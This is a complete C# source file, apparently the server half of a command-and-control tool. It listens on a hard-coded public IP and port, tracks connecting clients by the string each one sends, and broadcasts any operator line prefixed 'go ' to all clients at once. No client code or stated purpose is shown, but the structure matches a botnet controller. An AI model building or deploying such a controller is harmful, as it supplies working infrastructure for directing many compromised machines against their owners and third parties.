using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

class Server
{
    private static Dictionary<string, TcpClient> clients = new Dictionary<string, TcpClient>();
    private static TcpListener listener;

    public static void Main()
    {
        listener = new TcpListener(IPAddress.Parse("193.58.121.250"), 7174);
        listener.Start();
        Console.WriteLine("[Server] Сервер запущен и ожидает подключения...");

        new Thread(CheckClients).Start();
        new Thread(HandleInput).Start();

        while (true)
        {
            TcpClient client = listener.AcceptTcpClient();
            new Thread(() => HandleClient(client)).Start();
        }
    }

    private static void HandleClient(TcpClient client)
    {
        NetworkStream stream = client.GetStream();
        byte[] buffer = new byte[1024];

        int bytesRead = stream.Read(buffer, 0, buffer.Length);
        string clientInfo = Encoding.UTF8.GetString(buffer, 0, bytesRead);

        lock (clients)
        {
            clients[clientInfo] = client;
            Console.WriteLine($"[+] Joined ({clientInfo})");
        }

        while (client.Connected)
        {
            try
            {
                bytesRead = stream.Read(buffer, 0, buffer.Length);
                if (bytesRead > 0)
                {
                    lock (clients)
                    {
                        clients[clientInfo] = client;
                    }
                }
            }
            catch
            {
                break;
            }
        }

        lock (clients)
        {
            clients.Remove(clientInfo);
            Console.WriteLine($"[-] Leaved ({clientInfo})");
        }
    }

    private static void CheckClients()
    {
        while (true)
        {
            Thread.Sleep(5000);

            lock (clients)
            {
                List<string> toRemove = new List<string>();
                foreach (var client in clients)
                {
                    if (!client.Value.Connected)
                    {
                        Console.WriteLine($"[-] Leaved ({client.Key})");
                        toRemove.Add(client.Key);
                    }
                }

                foreach (var clientInfo in toRemove)
                {
                    clients.Remove(clientInfo);
                }
            }
        }
    }

    private static void HandleInput()
    {
        while (true)
        {
            string input = Console.ReadLine();
            if (input.StartsWith("go "))
            {
                string command = input.Substring(3);
                SendCommand(command);
            }
        }
    }

    public static void SendCommand(string command)
    {
        lock (clients)
        {
            foreach (var client in clients)
            {
                try
                {
                    NetworkStream stream = client.Value.GetStream();
                    byte[] data = Encoding.UTF8.GetBytes(command);
                    stream.Write(data, 0, data.Length);
                }
                catch (Exception)
                {
                    // Ошибка отправки команды
                }
            }
        }
    }
}